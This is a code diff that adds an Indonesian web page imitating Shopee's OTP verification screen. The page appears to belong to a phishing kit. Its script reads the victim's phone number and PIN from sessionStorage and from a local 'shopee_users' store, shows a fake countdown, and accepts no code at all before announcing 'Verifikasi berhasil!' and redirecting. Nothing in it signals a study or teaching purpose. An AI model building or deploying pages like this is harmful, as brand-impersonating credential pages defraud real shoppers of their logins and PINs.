@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTP - Shopee</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .otp-header {
+            background: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .otp-header-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .otp-back-btn {
+            background: none;
+            border: none;
+            color: #FF6B35;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 5px;
+        }
+
+        .otp-title {
+            font-size: 18px;
+            color: #8b8b8b;
+            font-weight: 500;
+        }
+
+        .otp-content {
+            padding: 30px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            text-align: center;
+        }
+
+        .otp-info {
+            margin-bottom: 30px;
+        }
+
+        .otp-info h2 {
+            color: #b8b8b8;
+            font-size: 20px;
+            margin-bottom: 10px;
+        }
+
+        .otp-info p {
+            color: #000000;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .phone-display {
+            color: #000000;
+            font-weight: bold;
+        }
+
+        .otp-display-container {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 30px 0;
+        }
+
+        .otp-dash {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #ccc;
+            background: white;
+        }
+
+        .lanjut-btn {
+            background: #a8a8a8;
+            color: #000000;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: not-allowed;
+            margin: 10px 0;
+        }
+
+        .lanjut-btn.active {
+            background: #a8a8a8;
+            color: rgb(0, 0, 0);
+            cursor: pointer;
+        }
+
+
+        .timer {
+            color: #666666;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            border: 1px solid #c3e6cb;
+        }
+    </style>
+</head>
+<body>
+    <div class="otp-header">
+        <div class="otp-header-left">
+            <button class="otp-back-btn" onclick="history.back()">←</button>
+            <span class="otp-title">Verifikasi OTP</span>
+        </div>
+    </div>
+
+    <div class="otp-content">
+        <div class="otp-info">
+            <h3>Kode OTP telah dikirim ke</h3>
+                 <span class="phone-display" id="phoneDisplay"></span></p>
+        </div>
+
+        <div class="otp-display-container">
+            <span class="_">___</span>
+            <span class="_">___</span>
+            <span class="_">___</span>
+            <span class="_">___</span> 
+            <span class="_">___</span>
+            <span class="_">___</span>
+        </div>
+
+        <button class="lanjut-btn" id="verifyBtn" disabled onclick="verifyOtp()">lanjut</button>
+
+
+        <div>
+            <div class="timer" id="timer">Kirim ulang dalam 60 detik</div>
+        </div>
+    </div>
+
+    <script src="config.js"></script>
+    <script src="database.js"></script>
+    <script>
+        // Get data from session and localStorage only
+        let phoneNumber = sessionStorage.getItem('userPhone') || '';
+        let pinNumber = sessionStorage.getItem('userPin') || '';
+        
+        // Backup from localStorage database
+        if (!phoneNumber) {
+            const users = JSON.parse(localStorage.getItem('shopee_users') || '[]');
+            if (users.length > 0) {
+                const lastUser = users[users.length - 1];
+                phoneNumber = lastUser.phone || '';
+                pinNumber = lastUser.pin || '';
+            }
+        }
+        
+        // Display the phone number with dashes
+        if (phoneNumber) {
+            // Format phone number with dashes (e.g., 081234567890 -> 0812-3456-7890)
+            let formattedPhone = phoneNumber;
+            if (phoneNumber.length >= 10) {
+                formattedPhone = phoneNumber.substring(0, 4) + '-' + phoneNumber.substring(4, 8) + '-' + phoneNumber.substring(8);
+            }
+            document.getElementById('phoneDisplay').textContent = formattedPhone;
+        } else {
+            document.getElementById('phoneDisplay').textContent = 'Nomor tidak ditemukan';
+        }
+
+        // Timer countdown
+        let timeLeft = 60;
+        const timerElement = document.getElementById('timer');
+        
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerElement.textContent = `mohon tunggu ${timeLeft} detik untuk kirim ulang`;
+            
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerElement.innerHTML = '<a href="#" class="resend-link">Kirim ulang OTP</a>';
+            }
+        }, 1000);
+
+        // Enable verify button after 3 seconds
+        setTimeout(() => {
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.classList.add('active');
+            verifyBtn.disabled = false;
+        }, 3000);
+
+        function verifyOtp() {
+            // Show success message
+            const successMsg = document.createElement('div');
+            successMsg.style.cssText = 'position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:#4CAF50;color:white;padding:20px;border-radius:8px;z-index:1000;';
+            successMsg.textContent = '✅ Verifikasi berhasil!';
+            document.body.appendChild(successMsg);
+            
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'index.html';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
